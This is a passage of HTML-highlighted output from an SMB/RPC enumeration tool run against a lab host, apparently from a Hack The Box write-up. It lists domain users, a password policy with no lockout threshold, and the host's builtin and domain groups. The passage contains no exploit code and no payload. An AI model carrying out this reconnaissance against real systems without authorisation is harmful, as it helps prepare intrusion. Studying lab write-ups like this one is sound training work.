+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>svc</span><span class=o>-</span><span class=n>alfresco</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47b</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>andy</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>mark</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47f</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>santi</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x480</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>=================================</span><span class=p>(</span> <span class=n>Share</span> <span class=n>Enumeration</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>=================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>do_connect</span><span class=p>:</span> <span class=n>Connection</span> <span class=n>to</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=n>failed</span> <span class=p>(</span><span class=n>Error</span> <span class=n>NT_STATUS_RESOURCE_NAME_NOT_FOUND</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>Sharename</span>       <span class=n>Type</span>      <span class=n>Comment</span>
+</span></span><span class=line><span class=cl>        <span class=o>---------</span>       <span class=o>----</span>      <span class=o>-------</span>
+</span></span><span class=line><span class=cl><span class=n>Reconnecting</span> <span class=n>with</span> <span class=n>SMB1</span> <span class=k>for</span> <span class=n>workgroup</span> <span class=n>listing</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>Unable</span> <span class=n>to</span> <span class=n>connect</span> <span class=n>with</span> <span class=n>SMB1</span> <span class=o>--</span> <span class=n>no</span> <span class=n>workgroup</span> <span class=n>available</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Attempting</span> <span class=n>to</span> <span class=n>map</span> <span class=n>shares</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>===========================</span><span class=p>(</span> <span class=n>Password</span> <span class=n>Policy</span> <span class=n>Information</span> <span class=k>for</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>===========================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Attaching</span> <span class=n>to</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=n>using</span> <span class=n>a</span> <span class=n>NULL</span> <span class=n>share</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Trying</span> <span class=n>protocol</span> <span class=mi>139</span><span class=o>/</span><span class=n>SMB</span><span class=o>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>Protocol</span> <span class=n>failed</span><span class=p>:</span> <span class=n>Cannot</span> <span class=n>request</span> <span class=n>session</span> <span class=p>(</span><span class=n>Called</span> <span class=n>Name</span><span class=p>:</span><span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Trying</span> <span class=n>protocol</span> <span class=mi>445</span><span class=o>/</span><span class=n>SMB</span><span class=o>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Found</span> <span class=n>domain</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>HTB</span>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Builtin</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Password</span> <span class=n>Info</span> <span class=k>for</span> <span class=n>Domain</span><span class=p>:</span> <span class=n>HTB</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Minimum</span> <span class=n>password</span> <span class=n>length</span><span class=p>:</span> <span class=mi>7</span>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Password</span> <span class=n>history</span> <span class=n>length</span><span class=p>:</span> <span class=mi>24</span>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Maximum</span> <span class=n>password</span> <span class=n>age</span><span class=p>:</span> <span class=n>Not</span> <span class=n>Set</span>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Password</span> <span class=n>Complexity</span> <span class=n>Flags</span><span class=p>:</span> <span class=mi>000000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Domain</span> <span class=n>Refuse</span> <span class=n>Password</span> <span class=n>Change</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Domain</span> <span class=n>Password</span> <span class=n>Store</span> <span class=n>Cleartext</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Domain</span> <span class=n>Password</span> <span class=n>Lockout</span> <span class=n>Admins</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Domain</span> <span class=n>Password</span> <span class=n>No</span> <span class=n>Clear</span> <span class=n>Change</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Domain</span> <span class=n>Password</span> <span class=n>No</span> <span class=n>Anon</span> <span class=n>Change</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Domain</span> <span class=n>Password</span> <span class=n>Complex</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Minimum</span> <span class=n>password</span> <span class=n>age</span><span class=p>:</span> <span class=mi>1</span> <span class=n>day</span> <span class=mi>4</span> <span class=n>minutes</span> 
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Reset</span> <span class=n>Account</span> <span class=n>Lockout</span> <span class=n>Counter</span><span class=p>:</span> <span class=mi>30</span> <span class=n>minutes</span> 
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Locked</span> <span class=n>Account</span> <span class=n>Duration</span><span class=p>:</span> <span class=mi>30</span> <span class=n>minutes</span>  
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Account</span> <span class=n>Lockout</span> <span class=n>Threshold</span><span class=p>:</span> <span class=n>None</span>
+</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Forced</span> <span class=n>Log</span> <span class=n>off</span> <span class=n>Time</span><span class=p>:</span> <span class=n>Not</span> <span class=n>Set</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Retieved</span> <span class=n>partial</span> <span class=n>password</span> <span class=n>policy</span> <span class=n>with</span> <span class=n>rpcclient</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=n>Password</span> <span class=n>Complexity</span><span class=p>:</span> <span class=n>Disabled</span>                                                                                                                                                    <span class=mi>19</span><span class=p>:</span><span class=mi>16</span><span class=p>:</span><span class=mi>40</span> <span class=p>[</span><span class=mi>121</span><span class=o>/</span><span class=mi>531</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>Minimum</span> <span class=n>Password</span> <span class=n>Length</span><span class=p>:</span> <span class=mi>7</span>                                                                                                                                                                         
+</span></span><span class=line><span class=cl>                                                                                                                                                                                                   
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>======================================</span><span class=p>(</span> <span class=n>Groups</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>======================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Getting</span> <span class=n>builtin</span> <span class=n>groups</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Account</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x224</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Pre</span><span class=o>-</span><span class=n>Windows</span> <span class=mi>2000</span> <span class=n>Compatible</span> <span class=n>Access</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22a</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Incoming</span> <span class=n>Forest</span> <span class=n>Trust</span> <span class=n>Builders</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Windows</span> <span class=n>Authorization</span> <span class=n>Access</span> <span class=n>Group</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x230</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Terminal</span> <span class=n>Server</span> <span class=n>License</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x231</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Administrators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x220</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x221</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Guests</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x222</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Print</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x226</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Backup</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x227</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Replicator</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x228</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Remote</span> <span class=n>Desktop</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22b</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Network</span> <span class=n>Configuration</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22c</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=ne>Performance</span> <span class=n>Monitor</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=ne>Performance</span> <span class=n>Log</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x22f</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Distributed</span> <span class=n>COM</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x232</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>IIS_IUSRS</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x238</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Cryptographic</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x239</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Event</span> <span class=n>Log</span> <span class=n>Readers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Certificate</span> <span class=n>Service</span> <span class=n>DCOM</span> <span class=n>Access</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RDS</span> <span class=n>Remote</span> <span class=n>Access</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23f</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RDS</span> <span class=n>Endpoint</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x240</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RDS</span> <span class=n>Management</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x241</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Hyper</span><span class=o>-</span><span class=n>V</span> <span class=n>Administrators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x242</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Access</span> <span class=ne>Control</span> <span class=n>Assistance</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x243</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Remote</span> <span class=n>Management</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x244</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>System</span> <span class=n>Managed</span> <span class=n>Accounts</span> <span class=n>Group</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x245</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Storage</span> <span class=n>Replica</span> <span class=n>Administrators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x246</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Server</span> <span class=n>Operators</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x225</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span>  <span class=n>Getting</span> <span class=n>builtin</span> <span class=n>group</span> <span class=n>memberships</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Network</span> <span class=n>Configuration</span> <span class=n>Operators</span><span class=s1>&#39; (RID: 556) has member: cli_rpc_pipe_open_noauth: rpc_pipe_bind for pipe lsarpc failed with error NT_STATUS_IO_TIMEOUT</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Network</span> <span class=n>Configuration</span> <span class=n>Operators</span><span class=s1>&#39; (RID: 556) has member: Could not initialise lsa pipe</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Users</span><span class=s1>&#39; (RID: 545) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Guests</span><span class=s1>&#39; (RID: 546) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Print</span> <span class=n>Operators</span><span class=s1>&#39; (RID: 550) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Windows</span> <span class=n>Authorization</span> <span class=n>Access</span> <span class=n>Group</span><span class=s1>&#39; (RID: 560) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>System</span> <span class=n>Managed</span> <span class=n>Accounts</span> <span class=n>Group</span><span class=s1>&#39; (RID: 581) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>RDS</span> <span class=n>Management</span> <span class=n>Servers</span><span class=s1>&#39; (RID: 577) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>IIS_IUSRS</span><span class=s1>&#39; (RID: 568) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Administrators</span><span class=s1>&#39; (RID: 544) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Remote</span> <span class=n>Management</span> <span class=n>Users</span><span class=s1>&#39; (RID: 580) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Pre</span><span class=o>-</span><span class=n>Windows</span> <span class=mi>2000</span> <span class=n>Compatible</span> <span class=n>Access</span><span class=s1>&#39; (RID: 554) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Account</span> <span class=n>Operators</span><span class=s1>&#39; (RID: 548) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span>  <span class=n>Getting</span> <span class=n>local</span> <span class=n>groups</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>RAS</span> <span class=ow>and</span> <span class=n>IAS</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x229</span><span class=p>]</span>                                                                                                                                           <span class=mi>19</span><span class=p>:</span><span class=mi>22</span><span class=p>:</span><span class=mi>43</span> <span class=p>[</span><span class=mi>63</span><span class=o>/</span><span class=mi>531</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Allowed</span> <span class=n>RODC</span> <span class=n>Password</span> <span class=n>Replication</span> <span class=n>Group</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23b</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Denied</span> <span class=n>RODC</span> <span class=n>Password</span> <span class=n>Replication</span> <span class=n>Group</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x23c</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>DnsAdmins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x44d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span>  <span class=n>Getting</span> <span class=n>local</span> <span class=n>group</span> <span class=n>memberships</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=n>Denied</span> <span class=n>RODC</span> <span class=n>Password</span> <span class=n>Replication</span> <span class=n>Group</span><span class=s1>&#39; (RID: 572) has member: Couldn&#39;</span><span class=n>t</span> <span class=n>lookup</span> <span class=n>SIDs</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span>  <span class=n>Getting</span> <span class=n>domain</span> <span class=n>groups</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Enterprise</span> <span class=n>Read</span><span class=o>-</span><span class=n>only</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x200</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x201</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Guests</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x202</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Computers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x203</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x204</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Schema</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x206</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Enterprise</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x207</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Group</span> <span class=n>Policy</span> <span class=n>Creator</span> <span class=n>Owners</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x208</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Read</span><span class=o>-</span><span class=n>only</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x209</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Cloneable</span> <span class=n>Domain</span> <span class=n>Controllers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20a</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Protected</span> <span class=n>Users</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Key</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Enterprise</span> <span class=n>Key</span> <span class=n>Admins</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x20f</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>DnsUpdateProxy</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x44e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Organization</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x450</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Recipient</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x451</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>View</span><span class=o>-</span><span class=n>Only</span> <span class=n>Organization</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x452</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Public</span> <span class=n>Folder</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x453</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>UM</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x454</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Help</span> <span class=n>Desk</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x455</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Records</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x456</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Discovery</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x457</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Server</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x458</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Delegated</span> <span class=n>Setup</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x459</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Hygiene</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x45a</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Compliance</span> <span class=n>Management</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x45b</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Security</span> <span class=n>Reader</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x45c</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Security</span> <span class=n>Administrator</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x45d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Exchange</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x45e</span><span class=p>]</span>
